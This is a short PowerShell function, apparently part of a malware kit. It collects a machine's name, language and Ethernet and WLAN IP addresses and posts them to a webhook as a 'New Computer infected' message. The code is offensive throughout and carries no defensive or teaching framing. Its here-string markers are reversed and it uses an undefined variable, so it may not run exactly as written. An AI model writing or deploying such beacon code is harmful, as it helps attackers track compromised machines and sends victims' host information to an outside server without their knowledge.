function sendInfection {
    param (
        [string] $Webhook
    )
    begin {
    }
    process {
        try { 
            $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
        } catch { 
            $ipEthernet = 'No Ethernet'
        } 
        try { 
            $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Wlan*).IPAddress
        } 
        catch { 
            $ipWlan = 'No Wlan' 
        } 
        $description = "@
            New Computer infected 
            Computer Name = $env:computername 
            Computer Language = $language
            Ethernet IP = $ipEthernet
            WLan IP = $ipWlan
        @"
        $payload = [PSCustomObject]@{content=$description}
        Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
    }
    end {
    }
}